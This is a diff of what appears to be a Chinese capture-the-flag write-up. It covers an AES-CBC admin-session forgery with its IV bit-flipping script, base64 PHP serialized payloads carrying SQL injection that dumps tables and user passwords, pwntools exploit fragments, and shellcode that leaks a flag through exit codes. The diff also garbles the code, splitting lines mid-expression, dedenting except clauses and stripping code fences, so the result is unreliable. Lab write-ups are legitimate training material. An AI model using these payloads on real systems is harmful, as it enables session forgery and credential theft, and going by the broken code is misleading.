@@ -88,10 +88,12 @@ def encrypt(session):
 
 def decrypt(session):
  raw = b64decode(session)
- cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])
+ cipher = AES.new(key, AES.MODE_CBC, raw[:
+AES.block_size])
  try:
  return unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode()
- except Exception:
+ 
+except Exception:
  return None
 
 @app.route('/')
@@ -110,7 +112,8 @@ def index():
  return FLAG
  else:
  return 'You are not an administrator'
- except Exception:
+ 
+except Exception:
  return 'You are not an administrator'
  else:
  return 'You are not an administrator'
@@ -135,7 +138,8 @@ iv是随机生成的，拼接在aes加密后的内容前面
 
 aes加密输入和输出长度相同，那么iv就是第一组，一共四组
 
-#-*- coding:utf8 -*-
+#-*- coding:
+utf8 -*-
 import base64
 import urllib.parse
 
@@ -143,7 +147,7 @@ import urllib.parse
 #{"admin": 0, "us
 #ername": "guest"
 #}
- 
+
 cipher = base64.b64decode("TNiZwJ1V0g85nLqM1jfOX1reKVgrHiKB0+bIGYVMheQzedUjeMPnLNurPIrXcu4oLpj9hv44MTY/81gPHaGYLg==")
 print(len(cipher))
 
@@ -257,7 +261,7 @@ shellcode类型，有沙箱
 
 mov rdx,{j}
 xor dl,byte ptr [r8-0x1290+{i}]
-mov rax, 231 
+mov rax, 231
 mov rdi, rdx
 syscall
 
@@ -379,17 +383,7 @@ Twitter：@wgpsec
 
 ```
 Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjU3OiI5OTkndW5pb24gc2VsZWN0IChzZWxlY3Qgc3FsIGZyb20gc3FsaXRlX21hc3RlciksMiwzLDQtLSAiO3M6MTE6IgAqAHBhc3N3b3JkIjtzOjMyOiI1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OSI7czoxMDoiACoAcHJvZmlsZSI7Tjt9
-```
-
-
-
-```
 Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjcwOiI5OTkndW5pb24gc2VsZWN0ICAoc2VsZWN0IGdyb3VwX2NvbmNhdChwYXNzd29yZCkgZnJvbSB1c2VycykgLDIsMyw0LS0gIjtzOjExOiIAKgBwYXNzd29yZCI7czozMjoiNWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTkiO3M6MTA6IgAqAHByb2ZpbGUiO047fQ==
-```
-
-
-
-```
 from os import environ
 from hashlib import md5
 from Crypto.Cipher import AES
@@ -415,10 +409,12 @@ def encrypt(session):
 
 def decrypt(session):
  raw = b64decode(session)
- cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])
+ cipher = AES.new(key, AES.MODE_CBC, raw[:
+AES.block_size])
  try:
  return unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode()
- except Exception:
+ 
+except Exception:
  return None
 
 @app.route('/')
@@ -437,44 +433,31 @@ def index():
  return FLAG
  else:
  return 'You are not an administrator'
- except Exception:
+ 
+except Exception:
  return 'You are not an administrator'
  else:
  return 'You are not an administrator'
 
 if __name__ == '__main__':
  app.run('0.0.0.0', PORT)
-```
-
-
-
-```
 {"admin": 0, "us
 ername": "guest"
 }
-```
-
-
-
-```
 def encrypt(session):
  iv = get_random_bytes(AES.block_size)
  cipher = AES.new(key, AES.MODE_CBC, iv)
  return b64encode(iv + cipher.encrypt(pad(session.encode('utf-8'), AES.block_size)))
-```
-
-
-
-```
-#-*- coding:utf8 -*-
+#-*- coding:
+utf8 -*-
 import base64
 import urllib.parse
 
-#iv
+    #iv
 #{"admin": 0, "us
-#ername": "guest"
+    #ername": "guest"
 #}
- 
+
 cipher = base64.b64decode("TNiZwJ1V0g85nLqM1jfOX1reKVgrHiKB0+bIGYVMheQzedUjeMPnLNurPIrXcu4oLpj9hv44MTY/81gPHaGYLg==")
 print(len(cipher))
 
@@ -495,11 +478,6 @@ for i in range(0,16):
 newiv = bytes(newiv)
 
 print('newiv:',base64.b64encode(newiv+cipher[16:]))
-```
-
-
-
-```
 from pwn import *
  context.log_level="debug"
  def exp():
@@ -532,11 +510,6 @@ from pwn import *
     io.recv()
 
 exp()
-```
-
-
-
-```
 from pwn import *
  context.log_level="debug"
  def exp():
@@ -569,21 +542,11 @@ from pwn import *
     io.recvall()
 
 exp()
-```
-
-
-
-```
 mov rdx,{j}
 xor dl,byte ptr [r8-0x1290+{i}]
-mov rax, 231 
+mov rax, 231
 mov rdi, rdx
 syscall
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'error'
 
@@ -615,11 +578,6 @@ def exp():
     print(flag)
     
  exp()
-```
-
-
-
-```
 from pwn import *
 context.log_level="debug"
 context.arch="amd64"
@@ -637,11 +595,6 @@ def exp():
     io.recv()
     
 exp()
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = "debug"
